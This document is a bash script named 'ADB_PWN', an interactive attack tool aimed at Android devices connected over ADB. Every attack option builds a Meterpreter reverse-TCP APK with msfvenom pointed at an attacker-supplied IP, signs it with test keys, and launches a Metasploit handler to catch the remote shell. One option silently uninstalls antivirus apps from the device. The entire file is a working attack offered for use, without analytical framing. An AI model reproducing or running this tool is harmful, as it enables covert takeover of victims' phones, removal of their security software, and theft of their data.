#!/bin/bash

clear


echo -e "\e[32m[*] \e[39mADB_PWN"   
echo -e "\e[32m[*]"
echo -e "\e[32m[*] \e[39mversion: 1.3"   
echo -e "\e[32m[*] \e[39mcreated by phaint"
echo 
echo


echo "Select from the menu: "
echo
echo "1) All-in-one attack" 
echo "2) Generate payload" 
echo "3) Attack with existant payload" 
echo "4) Uninstall antiviruses"
echo "5) Minimum access method"
echo 
echo "Enter your choice: "
read n
echo 
case $n in
    1)  { 
	clear
	echo Selected: All-in-one attack
	echo [*]Enter attacker ip:
	read ip
	echo [*]Generating payload
	echo
	
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=5557 > OP_ADB_uns.apk
	echo
	echo [*]Signing payload with security certificate
	echo
        java -jar signapk.jar testkey.x509.pem testkey.pk8 OP_ADB_uns.apk OP_ADB.apk
	
	echo -n "" > conf.rc
	echo use multi/handler >> conf.rc
	echo set payload android/meterpreter/reverse_tcp >> conf.rc
	echo set LPORT 5557 >> conf.rc
	echo set LHOST $ip >> conf.rc
	echo exploit >> conf.rc

	gnome-terminal -e './DP.sh'

	msfconsole -r conf.rc
	} ;;
    2)  {
	clear
	echo Selected: Generate payload
	echo [*]Enter attacker ip:
	read ip
	echo [*]Generating payload
	echo
	
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=5557 > OP_ADB_uns.apk
	echo
	echo [*]Signing payload with security certificate
	echo
        java -jar signapk.jar testkey.x509.pem testkey.pk8 OP_ADB_uns.apk OP_ADB.apk
	} ;;
    3)  {
	clear
	echo Selected: Attack with existant payload
	echo [*]Enter attacker ip:
	read ip
	echo -n "" > conf.rc
	echo use multi/handler >> conf.rc
	echo set payload android/meterpreter/reverse_tcp >> conf.rc
	echo set LPORT 5557 >> conf.rc
	echo set LHOST $ip >> conf.rc
	echo exploit >> conf.rc

	gnome-terminal -e './DP.sh'

	msfconsole -r conf.rc
	} ;;
    4)  { 
	clear
         echo Selected: Uninstall antiviruses
	 adb -d uninstall com.bitdefender.antivirus
	 adb -d uninstall com.antivirus
	 adb -d uninstall com.avira.android 
	} ;;
     5) { 
	clear
	echo Selected: Minimum access method
	echo [*]Enter attacker ip:
	read ip
	echo [*]Generating payload
	echo
	
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=5557 > OP_ADB_uns.apk
	echo
	echo [*]Signing payload with security certificate
	echo
        java -jar signapk.jar testkey.x509.pem testkey.pk8 OP_ADB_uns.apk OP_ADB.apk
	echo -n "" > conf.rc
	echo use multi/handler >> conf.rc
	echo set payload android/meterpreter/reverse_tcp >> conf.rc
	echo set LPORT 5557 >> conf.rc
	echo set LHOST $ip >> conf.rc
	echo exploit >> conf.rc
	
	gnome-terminal -e './DP-w.sh'

	msfconsole -r conf.rc
	} ;;
    *) echo invalid;;
esac

read -p ""




